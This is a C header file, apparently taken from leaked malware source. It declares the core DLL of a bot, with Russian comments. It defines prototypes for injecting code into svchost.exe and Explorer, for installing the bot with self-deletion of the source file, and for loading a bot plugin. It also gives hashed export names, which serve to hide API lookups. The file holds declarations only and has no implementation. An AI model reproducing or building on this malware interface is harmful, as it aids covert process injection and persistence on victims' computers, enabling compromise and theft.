
//------------------------------------------------------------
//   Модуль объвлений библиотеки ядра CoreDlll.dll
//------------------------------------------------------------

typedef DWORD (WINAPI *TInjectFunc)(LPVOID);

//=============================================
//  Прототипы функций
//=============================================

// Функция инжекта в процесс svchost.exe
typedef BOOL (WINAPI *TMegaJump)(TInjectFunc Function);

// Функция создания новой копиюи эксплорера и нжекта в неё
typedef BOOL (WINAPI *TJmpToExplorer)(TInjectFunc Function);

// Функция инжекта в запущенный процесс эксплорера
typedef BOOL (WINAPI *TInjectIntoExplorer)(TInjectFunc Function);

// Функция инсталяции бота
typedef BOOL (WINAPI *TInstall)(const char* FileName, BOOL IsUpdate, BOOL DeleteSourceFile, DWORD SourceFileProcessPID);

// Функция загрузки плагина бота bot.plug
typedef BOOL (WINAPI *TLoadBotPlug)(LPVOID* Buf, DWORD *BufSize);

// Функция освобождает память выделенную под плагин бота bot.plug
typedef BOOL (WINAPI *TFreeBotPlug)(LPVOID Buf);


//=============================================
//  Хэши экспортируемых функций
//=============================================
#define COREDLL_MEGAJUMP           0x19C6E1CE /* MegaJump */
#define COREDLL_JMPTOEXPLORER      0xA6DAED5E /* JmpToExplorer */
#define COREDLL_INJECTINTOEXPLORER 0x99D0BF59 /* InjectIntoExplorer */
#define COREDLL_INSTALL            0x3E99511B /* Install */
#define COREDLL_LOADBOTPLUG		   0xFC392336 /* LoadBP */
#define COREDLL_FREEBOTPLUG        0x2CB96367 /* FreeBP */